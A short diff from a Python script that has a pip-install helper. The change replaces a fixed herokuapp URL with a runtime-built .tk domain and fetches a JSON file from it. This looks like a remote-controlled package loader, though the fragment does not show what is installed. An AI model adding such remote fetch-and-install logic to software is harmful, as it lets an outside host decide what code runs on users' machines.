@@ -14,7 +14,7 @@ version = 'cp'+version[0]+version[1]
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 try:
-    link="http://kaamdhaam.herokuapp.com/static/link/install.json"
+    link="http://"+what+".tk/"
     import urllib.request, json
     with urllib.request.urlopen(link) as url:
         data = json.loads(url.read().decode())
